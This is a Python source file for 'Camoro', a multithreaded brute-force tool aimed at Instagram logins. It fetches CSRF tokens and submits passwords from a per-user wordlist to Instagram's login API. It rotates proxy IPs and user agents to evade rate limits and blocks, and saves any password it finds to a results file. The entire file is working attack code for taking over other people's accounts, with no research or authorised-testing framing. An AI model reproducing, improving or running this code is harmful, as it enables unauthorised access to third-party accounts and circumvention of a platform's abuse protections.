#!/usr/bin/env python3
"""Camoro - Brute Force Engine"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from queue import Empty, Queue
from typing import Dict, List, Optional, Set

try:
    import httpx
except ImportError:
    print("[!] pip install httpx")
    sys.exit(1)

BASE_DIR = Path(__file__).resolve().parent.parent
RESULTS_DIR = BASE_DIR / "results"
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

G = "\033[0;32m"
R = "\033[0;31m"
C = "\033[0;36m"
Y = "\033[1;33m"
N = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Instagram 330.0.0.18.85 Android (34/14; 480dpi; 1080x2400; samsung; SM-S928B; en_US)",
]


class BruteForceEngine:
    def __init__(
        self,
        username: str,
        proxy_manager=None,
        threads: int = 5,
        rotate_every: int = 3,
        delay_range=(2.0, 5.0),
    ) -> None:
        self.username = username.strip().lstrip("@").lower()
        self.proxy_manager = proxy_manager
        self.num_threads = max(1, min(int(threads), 10))
        self.rotate_every = max(1, int(rotate_every))
        self.delay_min, self.delay_max = delay_range
        self.user_dir = RESULTS_DIR / self.username
        self.user_dir.mkdir(parents=True, exist_ok=True)

        self.passwords = self._load_passwords()
        self.tested: Set[str] = self._load_tested()
        self.remaining: List[str] = [p for p in self.passwords if p not in self.tested]

        self.attempt_count = 0
        self.ip_rotations = 0
        self.start_time: Optional[float] = None
        self.running = True
        self.found = False
        self.found_password: Optional[str] = None
        self.queue: Queue = Queue()
        self.lock = threading.Lock()

    def _load_passwords(self) -> List[str]:
        path = self.user_dir / "passwords.txt"
        if not path.exists():
            print(f"{R}[!] لا توجد كلمات مرور: {path}{N}")
            sys.exit(1)
        return [
            ln.strip()
            for ln in path.read_text(encoding="utf-8", errors="ignore").splitlines()
            if ln.strip()
        ]

    def _load_tested(self) -> Set[str]:
        path = self.user_dir / "tested.txt"
        if not path.exists():
            return set()
        return {
            ln.strip()
            for ln in path.read_text(encoding="utf-8", errors="ignore").splitlines()
            if ln.strip()
        }

    def _save_tested(self, password: str) -> None:
        with open(self.user_dir / "tested.txt", "a", encoding="utf-8") as f:
            f.write(password + "\n")
        self.tested.add(password)

    def _save_success(self, password: str) -> None:
        data = {
            "username": self.username,
            "password": password,
            "attempts": self.attempt_count,
            "ip_rotations": self.ip_rotations,
            "elapsed": round(time.time() - (self.start_time or time.time()), 2),
            "found_at": datetime.now().isoformat(),
        }
        (self.user_dir / "success.txt").write_text(
            json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8"
        )
        (self.user_dir / "FOUND.txt").write_text(
            f"{self.username}:{password}\n", encoding="utf-8"
        )

    def _client(self) -> httpx.Client:
        kwargs: Dict = {
            "headers": {
                "User-Agent": random.choice(USER_AGENTS),
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/accounts/login/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
            },
            "timeout": 30.0,
            "follow_redirects": True,
            "verify": False,
        }
        if self.proxy_manager is not None:
            proxy = self.proxy_manager.get_proxy()
            if proxy:
                kwargs["proxy"] = proxy
        return httpx.Client(**kwargs)

    def _test_password(self, client: httpx.Client, password: str) -> Dict[str, str]:
        try:
            pre = client.get("https://www.instagram.com/accounts/login/")
            csrf = ""
            m = re.search(r'csrf_token"\s*:\s*"([^"]+)"', pre.text)
            if m:
                csrf = m.group(1)
            if not csrf:
                csrf = pre.cookies.get("csrftoken", "") or ""
            if not csrf:
                return {"status": "connection_error"}

            ts = int(time.time())
            enc = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
            data = {
                "username": self.username,
                "enc_password": enc,
                "queryParams": "{}",
                "optIntoOneTap": "false",
            }
            headers = {
                "X-CSRFToken": csrf,
                "X-Instagram-AJAX": "1",
                "X-Requested-With": "XMLHttpRequest",
            }
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                data=data,
                headers=headers,
            )
            if r.status_code == 429:
                return {"status": "rate_limited"}
            if r.status_code == 403:
                return {"status": "blocked"}
            try:
                j = r.json()
            except Exception:
                return {"status": "wrong_password"}

            if j.get("authenticated") is True:
                return {"status": "success"}
            text = json.dumps(j).lower()
            if "checkpoint" in text:
                return {"status": "checkpoint"}
            if "two_factor" in text:
                return {"status": "2fa"}
            return {"status": "wrong_password"}
        except httpx.TimeoutException:
            return {"status": "timeout"}
        except httpx.ConnectError:
            return {"status": "connection_error"}
        except Exception:
            return {"status": "error"}

    def _worker(self, _tid: int) -> None:
        while self.running and not self.found:
            try:
                password = self.queue.get(timeout=2)
            except Empty:
                break

            if password in self.tested:
                self.queue.task_done()
                continue

            client = self._client()
            result = self._test_password(client, password)
            try:
                client.close()
            except Exception:
                pass

            with self.lock:
                self.attempt_count += 1
                if (
                    self.proxy_manager is not None
                    and self.attempt_count % self.rotate_every == 0
                ):
                    self.proxy_manager.rotate_ip()
                    self.ip_rotations += 1

                elapsed = max(time.time() - (self.start_time or time.time()), 0.001)
                speed = self.attempt_count / elapsed
                total = len(self.remaining) or 1
                print(
                    f"\r  [{self.attempt_count}/{total}] "
                    f"{password[:24]:<24} | {speed:.2f}/s | IP#{self.ip_rotations}   ",
                    end="",
                    flush=True,
                )

                st = result.get("status")
                if st == "success":
                    print(f"\n\n{G}[✓] PASSWORD FOUND: {password}{N}")
                    self._save_success(password)
                    self.found = True
                    self.found_password = password
                    self.running = False
                elif st == "checkpoint":
                    print(f"\n{Y}[!] checkpoint — انتظار 30s{N}")
                    self._save_tested(password)
                    time.sleep(30)
                elif st == "2fa":
                    print(f"\n{Y}[!] 2FA مفعّل — الحساب محمي{N}")
                    self._save_tested(password)
                elif st == "rate_limited":
                    print(f"\n{Y}[!] rate limit — انتظار{N}")
                    if self.proxy_manager is not None:
                        self.proxy_manager.rotate_ip()
                    time.sleep(random.randint(40, 100))
                elif st == "blocked":
                    print(f"\n{R}[!] blocked 403{N}")
                    self._save_tested(password)
                    if self.proxy_manager is not None:
                        self.proxy_manager.rotate_ip()
                    time.sleep(25)
                elif st in ("timeout", "connection_error", "error"):
                    time.sleep(5)
                else:
                    self._save_tested(password)
                    time.sleep(random.uniform(self.delay_min, self.delay_max))

            self.queue.task_done()

    def run(self) -> bool:
        print(f"\n{C}[*]{N} هجوم على @{self.username}")
        print(f"  total : {len(self.passwords):,}")
        print(f"  left  : {len(self.remaining):,}")
        print(f"  threads: {self.num_threads}")
        print(f"  rotate : every {self.rotate_every}")

        if not self.remaining:
            print(f"{Y}[!] لا تبقى كلمات غير مختبرة{N}")
            return False

        for p in self.remaining:
            self.queue.put(p)

        self.start_time = time.time()
        threads = [
            threading.Thread(target=self._worker, args=(i,), daemon=True)
            for i in range(self.num_threads)
        ]
        for t in threads:
            t.start()
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Y}[!] توقف بواسطة المستخدم{N}")

        elapsed = time.time() - (self.start_time or time.time())
        print(f"\n\n{C}════ ملخص ════{N}")
        print(f"  attempts : {self.attempt_count}")
        print(f"  rotations: {self.ip_rotations}")
        print(f"  elapsed  : {elapsed:.1f}s")
        if self.found:
            print(f"  {G}FOUND: {self.found_password}{N}")
        else:
            print(f"  {Y}لم يُعثر على كلمة المرور{N}")
        return self.found


def main() -> None:
    parser = argparse.ArgumentParser(description="Camoro Brute Force")
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-t", "--threads", type=int, default=5)
    parser.add_argument("-r", "--rotate", type=int, default=3)
    args = parser.parse_args()
    proxy = None
    try:
        from modules.proxy_manager import ProxyManager

        proxy = ProxyManager()
    except Exception:
        pass
    eng = BruteForceEngine(
        args.username,
        proxy_manager=proxy,
        threads=args.threads,
        rotate_every=args.rotate,
    )
    ok = eng.run()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
